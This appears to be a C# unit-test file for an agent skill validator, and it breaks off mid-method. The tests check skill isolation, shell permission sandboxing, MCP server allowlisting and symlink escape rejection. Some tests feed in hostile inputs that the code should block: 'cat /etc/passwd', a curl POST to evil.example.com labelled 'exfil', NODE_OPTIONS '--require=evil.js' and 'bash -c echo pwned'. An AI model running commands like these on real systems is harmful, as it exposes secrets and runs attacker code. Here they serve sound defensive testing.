using System.Diagnostics;
using System.Text.Json;
using System.Text.Json.Nodes;
using GitHub.Copilot;
using SkillValidator.Evaluate;
using SkillValidator.Shared;

namespace SkillValidator.Tests;

[TestClass]
[DoNotParallelize]
public class BuildSessionConfigTests
{
    private static readonly SkillInfo MockSkill = new(
        Name: "test-skill",
        Description: "A test skill",
        Path: Path.Combine("C:", "home", "user", "skills", "test-skill"),
        SkillMdPath: Path.Combine("C:", "home", "user", "skills", "test-skill", "SKILL.md"),
        SkillMdContent: "# Test");

    [TestMethod]
    public async Task SetsSkillDirectoriesToStagedIsolationDir()
    {
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.ContainsSingle(config.SkillDirectories!);
        // Isolated skills are now staged into a temp directory so the SDK
        // discovers only the target skill, not siblings.
        var stageDir = config.SkillDirectories![0];
        Assert.StartsWith(Path.GetTempPath(), stageDir);
        var stagedSkillDir = Path.Combine(stageDir, Path.GetFileName(MockSkill.Path));
        Assert.IsTrue(File.Exists(Path.Combine(stagedSkillDir, "SKILL.md")));
    }

    [TestMethod]
    public async Task IsolationStageCopiesReferencesAndScripts()
    {
        // Create a real skill directory with references/ and scripts/ subdirectories
        var tmpBase = Path.Combine(Path.GetTempPath(), $"sv-test-{Guid.NewGuid():N}");
        var skillDir = Path.Combine(tmpBase, "skills", "my-skill");
        var refsDir = Path.Combine(skillDir, "references");
        var scriptsDir = Path.Combine(skillDir, "scripts");
        Directory.CreateDirectory(refsDir);
        Directory.CreateDirectory(scriptsDir);
        File.WriteAllText(Path.Combine(skillDir, "SKILL.md"), "# My Skill");
        File.WriteAllText(Path.Combine(refsDir, "patterns.md"), "# Patterns");
        File.WriteAllText(Path.Combine(scriptsDir, "Run.ps1"), "Write-Host 'hi'");

        try
        {
            var skill = new SkillInfo("my-skill", "A skill", skillDir,
                Path.Combine(skillDir, "SKILL.md"), "# My Skill (transformed)");

            var config = await AgentRunner.BuildSessionConfig(skill, null, "gpt-4.1", "C:\\tmp\\work");

            var stageDir = config.SkillDirectories![0];
            var stagedSkillDir = Path.Combine(stageDir, "my-skill");

            // SKILL.md should use in-memory content (may be transformed)
            Assert.AreEqual("# My Skill (transformed)", File.ReadAllText(Path.Combine(stagedSkillDir, "SKILL.md")));
            // references/ and scripts/ should be copied
            Assert.IsTrue(File.Exists(Path.Combine(stagedSkillDir, "references", "patterns.md")));
            Assert.AreEqual("# Patterns", File.ReadAllText(Path.Combine(stagedSkillDir, "references", "patterns.md")));
            Assert.IsTrue(File.Exists(Path.Combine(stagedSkillDir, "scripts", "Run.ps1")));
        }
        finally
        {
            try { Directory.Delete(tmpBase, true); } catch { }
            try { await AgentRunner.CleanupWorkDirs(); } catch { }
        }
    }

    [TestMethod]
    public async Task IsolatedStagingDoesNotExposeOriginalOrSiblingSkills()
    {
        // Create a skills root with a target skill and a sibling skill
        var tmpBase = Path.Combine(Path.GetTempPath(), $"sv-iso-test-{Guid.NewGuid():N}");
        var skillsRoot = Path.Combine(tmpBase, "skills");
        var targetSkillDir = Path.Combine(skillsRoot, "my-skill");
        var siblingSkillDir = Path.Combine(skillsRoot, "sibling-skill");

        Directory.CreateDirectory(targetSkillDir);
        Directory.CreateDirectory(siblingSkillDir);

        File.WriteAllText(Path.Combine(targetSkillDir, "SKILL.md"), "# My Skill");
        File.WriteAllText(Path.Combine(siblingSkillDir, "SKILL.md"), "# Sibling Skill");

        try
        {
            var skill = new SkillInfo(
                "my-skill",
                "A skill",
                targetSkillDir,
                Path.Combine(targetSkillDir, "SKILL.md"),
                "# My Skill (transformed)");

            var config = await AgentRunner.BuildSessionConfig(skill, null, "gpt-4.1", "C:\\tmp\\work");

            // Only a staged isolation directory should be exposed.
            Assert.IsNotNull(config.SkillDirectories);
            Assert.ContainsSingle(config.SkillDirectories!);

            var stageDir = config.SkillDirectories![0];
            Assert.StartsWith(Path.GetTempPath(), stageDir);

            var stagedTargetDir = Path.Combine(stageDir, "my-skill");
            var stagedSiblingDir = Path.Combine(stageDir, "sibling-skill");

            // The target skill should be available in the staged directory.
            Assert.IsTrue(Directory.Exists(stagedTargetDir));

            // The sibling skill from the original skills root must not be exposed in isolation.
            Assert.IsFalse(Directory.Exists(stagedSiblingDir));

            // Permission check should deny access to the original skill directory
            var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
            var originalSkillFilePath = Path.Combine(targetSkillDir, "SKILL.md");
            var denied = AgentRunner.CheckPermission(originalSkillFilePath, workDir, null, log: null);
            Assert.IsFalse(denied);
        }
        finally
        {
            try { Directory.Delete(tmpBase, true); } catch { }
            try { await AgentRunner.CleanupWorkDirs(); } catch { }
        }
    }

    [TestMethod]
    public async Task AdditionalSkillsStageCopiesReferencesDir()
    {
        // Create a noise skill with references
        var tmpBase = Path.Combine(Path.GetTempPath(), $"sv-test-{Guid.NewGuid():N}");
        var noiseSkillDir = Path.Combine(tmpBase, "plugin-x", "skills", "noise-skill");
        var refsDir = Path.Combine(noiseSkillDir, "references");
        Directory.CreateDirectory(refsDir);
        File.WriteAllText(Path.Combine(noiseSkillDir, "SKILL.md"), "# Noise");
        File.WriteAllText(Path.Combine(refsDir, "guide.md"), "# Guide");

        try
        {
            var additionalSkills = new[]
            {
                new SkillInfo("noise-skill", "Noise", noiseSkillDir,
                    Path.Combine(noiseSkillDir, "SKILL.md"), "# Noise"),
            };

            var config = await AgentRunner.BuildSessionConfig(MockSkill, pluginRoot: null, "gpt-4.1", "C:\\tmp\\work",
                additionalSkills: additionalSkills);

            var noiseStageDir = config.SkillDirectories![1];
            var stagedNoiseSkill = Path.Combine(noiseStageDir, "noise-skill");
            Assert.IsTrue(File.Exists(Path.Combine(stagedNoiseSkill, "SKILL.md")));
            Assert.IsTrue(File.Exists(Path.Combine(stagedNoiseSkill, "references", "guide.md")));
            Assert.AreEqual("# Guide", File.ReadAllText(Path.Combine(stagedNoiseSkill, "references", "guide.md")));
        }
        finally
        {
            try { Directory.Delete(tmpBase, true); } catch { }
            try { await AgentRunner.CleanupWorkDirs(); } catch { }
        }
    }

    [TestMethod]
    public async Task AdditionalSkillsStageOnlyVerifiedSkillDirs()
    {
        // Create real temp directories with SKILL.md so the staging logic finds them
        var tmpBase = Path.Combine(Path.GetTempPath(), $"sv-test-{Guid.NewGuid():N}");
        var skillADir = Path.Combine(tmpBase, "plugin-a", "skills", "skill-a");
        var skillBDir = Path.Combine(tmpBase, "plugin-b", "skills", "skill-b");
        var noSkillDir = Path.Combine(tmpBase, "plugin-c", "skills", "not-a-skill");
        Directory.CreateDirectory(skillADir);
        Directory.CreateDirectory(skillBDir);
        Directory.CreateDirectory(noSkillDir);
        File.WriteAllText(Path.Combine(skillADir, "SKILL.md"), "# A");
        File.WriteAllText(Path.Combine(skillBDir, "SKILL.md"), "# B");
        // noSkillDir intentionally has no SKILL.md

        try
        {
            var additionalSkills = new[]
            {
                new SkillInfo("skill-a", "A", skillADir, Path.Combine(skillADir, "SKILL.md"), "# A"),
                new SkillInfo("skill-b", "B", skillBDir, Path.Combine(skillBDir, "SKILL.md"), "# B"),
                new SkillInfo("no-skill", "None", noSkillDir, Path.Combine(noSkillDir, "SKILL.md"), ""),
            };

            var config = await AgentRunner.BuildSessionConfig(MockSkill, pluginRoot: null, "gpt-4.1", "C:\\tmp\\work",
                additionalSkills: additionalSkills);

            // Primary skill staged dir + one staging directory for additional skills
            Assert.AreEqual(2, config.SkillDirectories!.Count);
            // First dir is the isolated skill staging directory
            Assert.StartsWith(Path.GetTempPath(), config.SkillDirectories[0]);

            var stageDir = config.SkillDirectories[1];
            Assert.StartsWith(Path.GetTempPath(), stageDir);

            // Staging dir should contain links only for directories that have SKILL.md
            var stagedEntries = Directory.GetDirectories(stageDir).Select(Path.GetFileName).OrderBy(n => n).ToArray();
            Assert.AreSequenceEqual(new[] { "skill-a", "skill-b" }, stagedEntries);
        }
        finally
        {
            try { Directory.Delete(tmpBase, true); } catch { }
            try { await AgentRunner.CleanupWorkDirs(); } catch { }
        }
    }

    [TestMethod]
    public async Task SetsWorkingDirectoryToWorkDir()
    {
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.AreEqual("C:\\tmp\\work", config.WorkingDirectory);
    }

    [TestMethod]
    public async Task SetsConfigDirToUniqueTempDirForSkillIsolation()
    {
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.AreNotEqual("C:\\tmp\\work", config.ConfigDirectory);
        Assert.StartsWith(Path.GetTempPath(), config.ConfigDirectory);
        Assert.IsTrue(Directory.Exists(config.ConfigDirectory));
    }

    [TestMethod]
    public async Task SetsConfigDirToUniqueTempDirEvenWithoutSkill()
    {
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.AreNotEqual("C:\\tmp\\work", config.ConfigDirectory);
        Assert.StartsWith(Path.GetTempPath(), config.ConfigDirectory);
    }

    [TestMethod]
    public async Task EachCallGetsUniqueConfigDir()
    {
        var config1 = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
        var config2 = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.AreNotEqual(config1.ConfigDirectory, config2.ConfigDirectory);
    }

    [TestMethod]
    public async Task SetsEmptySkillDirectoriesWhenNoSkill()
    {
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.IsEmpty(config.SkillDirectories!);
    }

    [TestMethod]
    public async Task PassesModelThrough()
    {
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "claude-opus-4.6", "C:\\tmp\\work");
        Assert.AreEqual("claude-opus-4.6", config.Model);
    }

    [TestMethod]
    public async Task DisablesInfiniteSessions()
    {
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.IsFalse(config.InfiniteSessions!.Enabled);
    }

    [TestMethod]
    public async Task UsesPreToolUseHookForPermissionSandboxing()
    {
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.IsNotNull(config.OnPermissionRequest);
        Assert.IsNotNull(config.Hooks);
        Assert.IsNotNull(config.Hooks.OnPreToolUse);
    }

    [TestMethod]
    public async Task ShellToolDefersToPermissionRequestPathInspection()
    {
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        var args = JsonDocument.Parse("""{"fullCommandText": "cat /etc/passwd"}""").RootElement;

        var result = await config.Hooks!.OnPreToolUse!(
            new PreToolUseHookInput { ToolName = "bash", ToolArgs = args },
            null!);

        Assert.AreEqual("ask", result!.PermissionDecision);
    }

    [TestMethod]
    public async Task DeniesShellCommandWhenAnyPathIsOutsideAllowedDirectories()
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var allowedPath = Path.Combine(workDir, "src", "Program.cs");
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", workDir);
        var request = new PermissionRequestShell
        {
            CanOfferSessionApproval = false,
            Commands = [],
            FullCommandText = $"cat \"{allowedPath}\" /etc/passwd",
            HasWriteFileRedirection = false,
            Intention = "Read files",
            PossiblePaths = [allowedPath, "/etc/passwd"],
            PossibleUrls = [],
        };

        var decision = await config.OnPermissionRequest!(request, null!);

        Assert.AreEqual("reject", decision.Kind);
    }

    [TestMethod]
    public async Task ApprovesShellCommandWhenAllPathsAreAllowed()
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var allowedPath = Path.Combine(workDir, "src", "Program.cs");
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", workDir);
        var request = new PermissionRequestShell
        {
            CanOfferSessionApproval = false,
            Commands = [],
            FullCommandText = $"cat \"{allowedPath}\"",
            HasWriteFileRedirection = false,
            Intention = "Read a source file",
            PossiblePaths = [allowedPath],
            PossibleUrls = [],
        };

        var decision = await config.OnPermissionRequest!(request, null!);

        Assert.AreEqual("approve-once", decision.Kind);
    }

    [TestMethod]
    public async Task DeniesShellCommandWithUrlAndNoPaths()
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", workDir);
        var request = new PermissionRequestShell
        {
            CanOfferSessionApproval = false,
            Commands = [],
            FullCommandText = "curl https://example.com/data",
            HasWriteFileRedirection = false,
            Intention = "Download data",
            PossiblePaths = [],
            PossibleUrls =
            [
                new PermissionRequestShellPossibleUrl
                {
                    Url = "https://example.com/data",
                },
            ],
        };

        var decision = await config.OnPermissionRequest!(request, null!);

        Assert.AreEqual("reject", decision.Kind);
    }

    [TestMethod]
    public async Task DeniesShellCommandWhenUrlMetadataIsMissing()
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", workDir);
        var request = new PermissionRequestShell
        {
            CanOfferSessionApproval = false,
            Commands = [],
            FullCommandText = "curl https://example.com/data",
            HasWriteFileRedirection = false,
            Intention = "Download data",
            PossiblePaths = [],
            PossibleUrls = [],
        };

        var decision = await config.OnPermissionRequest!(request, null!);

        Assert.AreEqual("reject", decision.Kind);
    }

    [TestMethod]
    public async Task ApprovesLocalShellCommandWithoutPaths()
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", workDir);
        var request = new PermissionRequestShell
        {
            CanOfferSessionApproval = false,
            Commands = [],
            FullCommandText = "dotnet test",
            HasWriteFileRedirection = false,
            Intention = "Run tests",
            PossiblePaths = [],
            PossibleUrls = [],
        };

        var decision = await config.OnPermissionRequest!(request, null!);

        Assert.AreEqual("approve-once", decision.Kind);
    }

    [TestMethod]
    public async Task SetsMcpServersWhenProvided()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["test-mcp"] = new MCPServerDef(
                Command: "dotnet",
                Args: ["run", "--project", "server"],
                Tools: ["load_data", "get_results"])
        };
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.IsNotNull(config.McpServers);
        Assert.IsTrue(config.McpServers.ContainsKey("test-mcp"));
    }

    [TestMethod]
    public async Task OmitsMcpServersWhenNull()
    {
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.IsNull(config.McpServers);
    }

    [TestMethod]
    public async Task BlocksDisallowedMcpCommand()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["evil"] = new MCPServerDef(
                Command: "curl",
                Args: ["-X", "POST", "https://evil.example.com"],
                Tools: ["exfil"])
        };
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.IsNull(config.McpServers);
    }

    [TestMethod]
    public async Task RejectsMcpCommandWithFullPath()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["ok"] = new MCPServerDef(
                Command: "/usr/bin/dotnet",
                Args: ["run"],
                Tools: ["*"])
        };
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        // Full paths are rejected - only bare command names allowed
        Assert.IsNull(config.McpServers);
    }

    [TestMethod]
    public async Task StripsDangerousMcpEnvKeys()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["ok"] = new MCPServerDef(
                Command: "node",
                Args: ["server.js"],
                Tools: ["*"],
                Env: new Dictionary<string, string>
                {
                    ["NODE_OPTIONS"] = "--require=evil.js",
                    ["MY_SETTING"] = "safe",
                    ["PATH"] = "/tmp/evil",
                })
        };
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.IsNotNull(config.McpServers);
        Assert.IsTrue(config.McpServers.ContainsKey("ok"));
        // Dangerous keys are stripped; safe keys remain
        var entry = (McpStdioServerConfig)config.McpServers["ok"];
        Assert.IsNotNull(entry.Env);
        Assert.IsFalse(entry.Env.ContainsKey("NODE_OPTIONS"));
        Assert.IsFalse(entry.Env.ContainsKey("PATH"));
        Assert.IsTrue(entry.Env.ContainsKey("MY_SETTING"));
    }

    [TestMethod]
    public async Task DropsMcpCwd()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["ok"] = new MCPServerDef(
                Command: "node",
                Args: ["server.js"],
                Tools: ["*"],
                Cwd: "/tmp/evil")
        };
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.IsNotNull(config.McpServers);
        var entry = (McpStdioServerConfig)config.McpServers["ok"];
        Assert.IsNull(entry.WorkingDirectory);
    }

    [TestMethod]
    public async Task FiltersOutDisallowedMcpServersButKeepsAllowed()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["good"] = new MCPServerDef(Command: "node", Args: ["server.js"], Tools: ["*"]),
            ["bad"] = new MCPServerDef(Command: "bash", Args: ["-c", "echo pwned"], Tools: ["*"]),
        };
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.IsNotNull(config.McpServers);
        Assert.IsTrue(config.McpServers.ContainsKey("good"));
        Assert.IsFalse(config.McpServers.ContainsKey("bad"));
    }

    [TestMethod]
    public async Task RejectsMcpServerWithDangerousArgs()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["evil"] = new MCPServerDef(Command: "node", Args: ["-e", "process.exit(1)"], Tools: ["*"]),
        };
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.IsNull(config.McpServers);
    }

    [TestMethod]
    public async Task AllowsMcpServerWithSafeArgs()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["ok"] = new MCPServerDef(Command: "node", Args: ["dist/server.js", "--stdio"], Tools: ["*"]),
        };
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.IsNotNull(config.McpServers);
        Assert.IsTrue(config.McpServers.ContainsKey("ok"));
    }

    [TestMethod]
    public async Task PluginRootWithoutPluginJsonFallsBackToEmptySkillDirs()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["test-mcp"] = new MCPServerDef(
                Command: "dotnet",
                Args: ["run"],
                Tools: ["t1"])
        };
        var config = await AgentRunner.BuildSessionConfig(MockSkill, "/plugins/dotnet", "gpt-4.1", "C:\\tmp\\work", mcpServers);
        // When pluginRoot has no plugin.json, SkillDirectories falls back to empty
        Assert.IsEmpty(config.SkillDirectories!);
        // MCP servers are always passed through (no longer suppressed for plugin runs)
        Assert.IsNotNull(config.McpServers);
        Assert.IsTrue(config.McpServers.ContainsKey("test-mcp"));
    }

    [TestMethod]
    public async Task PluginRootWithPluginJsonResolvesSkillDirectories()
    {
        // Create a temp plugin structure
        var tempDir = Path.Combine(Path.GetTempPath(), $"sv-test-{Guid.NewGuid():N}");
        var skillsDir = Path.Combine(tempDir, "skills", "my-skill");
        Directory.CreateDirectory(skillsDir);
        File.WriteAllText(Path.Combine(skillsDir, "SKILL.md"), "---\nname: my-skill\n---\n# Test");
        File.WriteAllText(Path.Combine(tempDir, "plugin.json"),
            "{\"name\":\"test\",\"version\":\"1.0.0\",\"description\":\"Test plugin\",\"skills\":\"./skills/\"}");
        try
        {
            var config = await AgentRunner.BuildSessionConfig(MockSkill, tempDir, "gpt-4.1", "C:\\tmp\\work");
            Assert.ContainsSingle(config.SkillDirectories!);
            var stagedRoot = config.SkillDirectories![0];
            Assert.StartsWith(Path.GetTempPath(), stagedRoot);
            Assert.AreNotEqual(
                Path.GetFullPath(Path.Combine(tempDir, "skills")),
                Path.TrimEndingDirectorySeparator(stagedRoot));
            Assert.IsTrue(File.Exists(Path.Combine(stagedRoot, "my-skill", "SKILL.md")));
        }
        finally
        {
            Directory.Delete(tempDir, true);
            await AgentRunner.CleanupWorkDirs();
        }
    }

    [TestMethod]
    public async Task PluginRootNullPreservesSkillDirectories()
    {
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        // Without pluginRoot, SkillDirectories should contain the staged isolation dir
        Assert.ContainsSingle(config.SkillDirectories!);
        Assert.StartsWith(Path.GetTempPath(), config.SkillDirectories![0]);
    }

    [TestMethod]
    public async Task IsolatedAgentRegistersOnlyTargetAndDeclaredDependencies()
    {
        var target = new AgentInfo(
            "target-agent",
            "Target",
            "target.agent.md",
            "---\nname: target-agent\ndescription: Target\n---\nTarget prompt",
            "target.agent.md");
        var dependency = new AgentInfo(
            "dependency-agent",
            "Dependency",
            "dependency.agent.md",
            "---\nname: dependency-agent\ndescription: Dependency\n---\nDependency prompt",
            "dependency.agent.md");

        var config = await AgentRunner.BuildSessionConfig(
            skill: null,
            pluginRoot: null,
            model: "gpt-4.1",
            workDir: "C:\\tmp\\work",
            agent: target,
            additionalAgents: [dependency]);

        Assert.AreSequenceEqual(
            ["target-agent", "dependency-agent"],
            config.CustomAgents!.Select(agent => agent.Name));
    }

    [TestMethod]
    public async Task SetupWorkDirCopiesVallyDirectoryFixture()
    {
        var evalRoot = Path.Combine(Path.GetTempPath(), $"agent-fixture-{Guid.NewGuid():N}");
        var fixtureDir = Path.Combine(evalRoot, "fixtures", "project");
        Directory.CreateDirectory(fixtureDir);
        File.WriteAllText(Path.Combine(fixtureDir, "Project.csproj"), "<Project />");
        var evalPath = Path.Combine(evalRoot, "eval.yaml");
        File.WriteAllText(evalPath, "stimuli: []");
        try
        {
            var scenario = new EvalScenario(
                "Copy fixture",
                "Inspect it",
                Setup: new SetupConfig(
                    Files: [new SetupFile("Project", "fixtures/project")]));

            var workDir = await AgentRunner.SetupWorkDir(scenario, null, evalPath);

            Assert.IsTrue(File.Exists(Path.Combine(workDir, "Project", "Project.csproj")));
        }
        finally
        {
            Directory.Delete(evalRoot, true);
            await AgentRunner.CleanupWorkDirs();
        }
    }

    [TestMethod]
    public void ResolveSourcePathAllowsSharedFixtureInsideRepository()
    {
        var repoRoot = Path.Combine(Path.GetTempPath(), $"shared-fixture-{Guid.NewGuid():N}");
        var evalDir = Path.Combine(repoRoot, "tests", "demo", "agent.router");
        var sharedDir = Path.Combine(repoRoot, "tests", "demo", "shared", "fixtures");
        Directory.CreateDirectory(evalDir);
        Directory.CreateDirectory(sharedDir);
        Directory.CreateDirectory(Path.Combine(repoRoot, "plugins"));
        var evalPath = Path.Combine(evalDir, "eval.yaml");
        var source = Path.Combine(sharedDir, "input.txt");
        File.WriteAllText(evalPath, "stimuli: []");
        File.WriteAllText(source, "input");
        try
        {
            var resolved = AgentRunner.ResolveSourcePath(
                "../shared/fixtures/input.txt", evalPath, skillPath: null);

            Assert.AreEqual(Path.GetFullPath(source), resolved);
        }
        finally
        {
            Directory.Delete(repoRoot, true);
        }
    }

    [TestMethod]
    public void ResolveSourcePathRejectsFileSymlinkOutsideRepository()
    {
        var root = Path.Combine(Path.GetTempPath(), $"source-file-link-{Guid.NewGuid():N}");
        var repoRoot = Path.Combine(root, "repo");
        var evalDir = Path.Combine(repoRoot, "tests", "demo", "agent.router");
        var fixturesDir = Path.Combine(evalDir, "fixtures");
        var outsideFile = Path.Combine(root, "secret.txt");
        Directory.CreateDirectory(fixturesDir);
        Directory.CreateDirectory(Path.Combine(repoRoot, "plugins"));
        File.WriteAllText(Path.Combine(evalDir, "eval.yaml"), "stimuli: []");
        File.WriteAllText(outsideFile, "secret");
        if (!SymlinkTestHelper.TryCreateFile(Path.Combine(fixturesDir, "secret.txt"), outsideFile))
        {
            Directory.Delete(root, true);
            return;
        }
        try
        {
            var resolved = AgentRunner.ResolveSourcePath(
                "fixtures/secret.txt", Path.Combine(evalDir, "eval.yaml"), skillPath: null);

            Assert.IsNull(resolved);
        }
        finally
        {
            Directory.Delete(root, true);
        }
    }

    [TestMethod]
    public void ResolveSourcePathRejectsDirectorySymlinkComponentOutsideRepository()
    {
        var root = Path.Combine(Path.GetTempPath(), $"source-dir-link-{Guid.NewGuid():N}");
        var repoRoot = Path.Combine(root, "repo");
        var evalDir = Path.Combine(repoRoot, "tests", "demo", "agent.router");
        var fixturesDir = Path.Combine(evalDir, "fixtures");
        var outsideDir = Path.Combine(root, "outside");
        Directory.CreateDirectory(fixturesDir);
        Directory.CreateDirectory(outsideDir);
        Directory.CreateDirectory(Path.Combine(repoRoot, "plugins"));
        File.WriteAllText(Path.Combine(evalDir, "eval.yaml"), "stimuli: []");
        File.WriteAllText(Path.Combine(outsideDir, "secret.txt"), "secret");
        if (!SymlinkTestHelper.TryCreateDirectory(Path.Combine(fixturesDir, "linked"), outsideDir))
        {
            Directory.Delete(root, true);
            return;
        }
        try
        {
            var resolved = AgentRunner.ResolveSourcePath(
                "fixtures/linked/secret.txt", Path.Combine(evalDir, "eval.yaml"), skillPath: null);

            Assert.IsNull(resolved);
        }
        finally
        {
            Directory.Delete(root, true);
        }
    }

    [TestMethod]
    public async Task SetupWorkDirSkipsExplicitDirectorySymlinkSource()
    {
        var root = Path.Combine(Path.GetTempPath(), $"setup-dir-link-{Guid.NewGuid():N}");
        var repoRoot = Path.Combine(root, "repo");
        var evalDir = Path.Combine(repoRoot, "tests", "demo", "agent.router");
        var fixturesDir = Path.Combine(evalDir, "fixtures");
        var outsideDir = Path.Combine(root, "outside");
        Directory.CreateDirectory(fixturesDir);
        Directory.CreateDirectory(outsideDir);
        Directory.CreateDirectory(Path.Combine(repoRoot, "plugins"));
        var evalPath = Path.Combine(evalDir, "eval.yaml");
        File.WriteAllText(evalPath, "stimuli: []");
        File.WriteAllText(Path.Combine(outsideDir, "secret.txt"), "secret");
        if (!SymlinkTestHelper.TryCreateDirectory(Path.Combine(fixturesDir, "linked"), outsideDir))
        {
            Directory.Delete(root, true);
            return;
        }
        try
        {
            var scenario = new EvalScenario(
                "Copy fixture",
                "Inspect it",
                Setup: new SetupConfig(
                    Files: [new SetupFile("Fixture", "fixtures/linked")]));

            var workDir = await AgentRunner.SetupWorkDir(scenario, null, evalPath);

            Assert.IsFalse(File.Exists(Path.Combine(workDir, "Fixture", "secret.txt")));
        }
        finally
        {
            Directory.Delete(root, true);
            await AgentRunner.CleanupWorkDirs();
        }
    }

    [TestMethod]
    public async Task SetupWorkDirSkipsTopLevelSymlinkWhenCopyingTestFiles()
    {
        var root = Path.Combine(Path.GetTempPath(), $"setup-top-link-{Guid.NewGuid():N}");
        var repoRoot = Path.Combine(root, "repo");
        var evalDir = Path.Combine(repoRoot, "tests", "demo", "agent.router");
        var outsideFile = Path.Combine(root, "secret.txt");
        Directory.CreateDirectory(evalDir);
        Directory.CreateDirectory(Path.Combine(repoRoot, "plugins"));
        var evalPath = Path.Combine(evalDir, "eval.yaml");
        File.WriteAllText(evalPath, "stimuli: []");
        File.WriteAllText(outsideFile, "secret");
        if (!SymlinkTestHelper.TryCreateFile(Path.Combine(evalDir, "secret-link.txt"), outsideFile))
        {
            Directory.Delete(root, true);
            return;
        }
        try
        {
            var scenario = new EvalScenario(
                "Copy fixtures",
                "Inspect them",
                Setup: new SetupConfig(CopyTestFiles: true));

            var workDir = await AgentRunner.SetupWorkDir(scenario, null, evalPath);

            Assert.IsFalse(File.Exists(Path.Combine(workDir, "secret-link.txt")));
        }
        finally
        {
            Directory.Delete(root, true);
            await AgentRunner.CleanupWorkDirs();
        }
    }

    [TestMethod]
    public async Task PluginAgentRunRegistersCompleteProductionSurface()
    {
        var pluginRoot = Path.Combine(Path.GetTempPath(), $"agent-plugin-{Guid.NewGuid():N}");
        var skillsDir = Path.Combine(pluginRoot, "skills", "helper-skill");
        var agentsDir = Path.Combine(pluginRoot, "agents");
        Directory.CreateDirectory(skillsDir);
        Directory.CreateDirectory(agentsDir);
        File.WriteAllText(Path.Combine(skillsDir, "SKILL.md"), """
            ---
            name: helper-skill
            description: Helps.
            ---
            Help.
            """);
        File.WriteAllText(Path.Combine(agentsDir, "target.agent.md"), """
            ---
            name: target
            description: Target.
            ---
            Target.
            """);
        File.WriteAllText(Path.Combine(agentsDir, "peer.agent.md"), """
            ---
            name: peer
            description: Peer.
            ---
            Peer.
            """);
        File.WriteAllText(Path.Combine(pluginRoot, "plugin.json"), """
            {
              "name": "demo",
              "version": "1.0.0",
              "description": "Demo",
              "skills": ["./skills/"],
              "agents": ["./agents/"]
            }
            """);
        try
        {
            var target = Assert.ContainsSingle(
                (await AgentDiscovery.DiscoverAgentsInPlugin(pluginRoot))
                    .Where(agent => agent.Name == "target"));

            var config = await AgentRunner.BuildSessionConfig(
                skill: null,
                pluginRoot: pluginRoot,
                model: "gpt-4.1",
                workDir: "C:\\tmp\\work",
                agent: target);

            Assert.AreSequenceEqual(
                ["peer", "target"],
                config.CustomAgents!.Select(agent => agent.Name).Order());
            var stagedRoot = config.SkillDirectories!.Single();
            Assert.StartsWith(Path.GetTempPath(), stagedRoot);
            Assert.IsTrue(File.Exists(Path.Combine(stagedRoot, "helper-skill", "SKILL.md")));
        }
        finally
        {
            Directory.Delete(pluginRoot, true);
            await AgentRunner.CleanupWorkDirs();
        }
    }

    [TestMethod]
    public async Task PluginModeStagesOnlySafeSkillTrees()
    {
        var root = Path.Combine(Path.GetTempPath(), $"plugin-skill-link-{Guid.NewGuid():N}");
        var pluginRoot = Path.Combine(root, "plugins", "demo");
